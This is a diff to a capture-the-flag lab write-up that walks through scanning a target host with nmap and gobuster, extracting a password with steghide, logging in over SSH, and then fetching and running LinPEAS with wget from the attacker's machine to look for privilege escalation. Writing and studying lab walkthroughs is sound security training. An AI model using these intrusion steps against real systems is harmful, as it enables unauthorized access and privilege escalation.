@@ -16,27 +16,24 @@
 ---
 
 ## Step 1 | Nmap
-'''bash
-nmap -sC -sT -p- -oN espscan.txt 10.10.99.131
-'''
+`nmap -sC -sT -p- -oN espscan.txt 10.10.99.131`
+
 - **Findings:**
 Port 80/tcp http
 Port 6498/tcp
 Port 65524/tcp
 
 ## Step 2 | Gobuster
-'''bash
-gobuster dir -u http://10.10.99.131/
-'''
+`gobuster dir -u http://10.10.99.131/`
+
 - **Findings:**
 /hidden
 /robots.txt
 /index.html
 
 Again
-'''bash
-gobuster dir -u http://10.10.99.131/hidden
-'''
+`gobuster dir -u http://10.10.99.131/hidden`
+
 - **Findings:**
 /whatever
 /index.html
@@ -46,23 +43,29 @@ gobuster dir -u http://10.10.99.131/hidden
 - Download to image.
 
 ## Step 4 | Steghide
-'''bash
-steghide -sh binarycodepixabay.jpg
-'''
+`steghide -sh binarycodepixabay.jpg`
+
 Output: "created secret.txt"
 
 - Read The .txt File:
-'''bash
-cat secret.txt
-'''
+
+`cat secret.txt`
+
 - Output: "(binary text: iconvertedmypasswordtobinary)"
 
 ## Step 4 | Connect To SSH
-'''bash
+```bash
 ssh boring@10.10.99.131 -p 6498
 password: iconvertedmypasswordtobinary
-'''
+```
+**Output:** "boring@kral4-PC: _"
 
-
-
+## Step 5 | Privilege Escalation With LinPEAS
+- CTRL+SHIFT+T -> `service apache2 start`
+- ```bash
+  boring@kral4-PC: wget <your IP>/linux/linpeas.sh
+  boring@kral4-PC: ch mod +x linpeas.sh
+  boring@kral4-PC: ./linpeas.sh
+  ```
+  - **Output:** 7 kernel vulnerabilities were detected
 
